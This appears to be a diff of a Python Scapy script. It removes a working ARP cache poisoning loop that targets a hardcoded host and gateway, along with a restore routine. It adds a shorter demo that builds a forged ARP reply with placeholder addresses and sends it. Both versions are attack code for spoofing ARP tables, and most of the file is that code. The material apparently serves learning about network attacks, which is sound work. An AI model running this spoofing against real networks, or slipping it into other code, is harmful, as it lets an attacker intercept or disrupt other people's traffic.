@@ -1,51 +1,28 @@
-#Phase: Not yet working as expected
-#the terminal becomes un-killable
-
-#https://medium.datadriveninvestor.com/arp-cache-poisoning-using-scapy-d6711ecbe112
-
 from scapy.all import *
 
-def getmac(targetip):
-	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
-	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
-	return targetmac
+#Declaring an arp packet
+packet = ARP()
+# This will show the default packet with source ip and mac of the client.
+print('\nThis will show the default packet with source ip and mac of the client.\n\n')
 
-def spoofarpcache(targetip, targetmac, sourceip):
-	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
-	send(spoofed, verbose= False)
+packet.display()
 
-def restorearp(targetip, targetmac, sourceip, sourcemac):
-	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
-	send(packet, verbose=False)
-	print("ARP Table restored to normal for", targetip)
+#Now setting the arp op code to 2 | ARP Reply
+packet.op = 2
 
-def main():
-	targetip= '10.105.130.22'
-	gatewayip= '10.105.130.23'
+print('-------------------\nNotice the change in ARP code, i.e. op from who-has to is-at\n\n')
 
-	try:
-		targetmac= '00:de:ad:be:ef:00'
-		print("Target MAC", targetmac)
-	except:
-		print("Target machine did not respond to ARP broadcast")
-		quit()
 
-	try:
-		gatewaymac= '00:de:ad:be:ef:00'
-		print("Gateway MAC:", gatewaymac)
-	except:
-		print("Gateway is unreachable")
-		quit()
-	try:
-		print("Sending spoofed ARP responses")
-		while True:
-			spoofarpcache(targetip, targetmac, gatewayip)
-			spoofarpcache(gatewayip, gatewaymac, targetip)
-	except KeyboardInterrupt:
-		print("ARP spoofing stopped")
-		restorearp(gatewayip, gatewaymac, targetip, targetmac)
-		restorearp(targetip, targetmac, gatewayip, gatewaymac)
-		quit()
+packet.display()
 
-if __name__=="__main__":
-	main()
+#Changing values to attack
+
+packet.hwsrc = '11:11:11:11:11:11'
+packet.psrc = '1.1.1.1'
+packet.hwdst = '22:22:22:22:22:22'
+packet.pdst = '2.2.2.2'
+print('-------------------\nNotice the change in other fields of ARP\n\n')
+
+packet.display()
+
+print(send(packet))
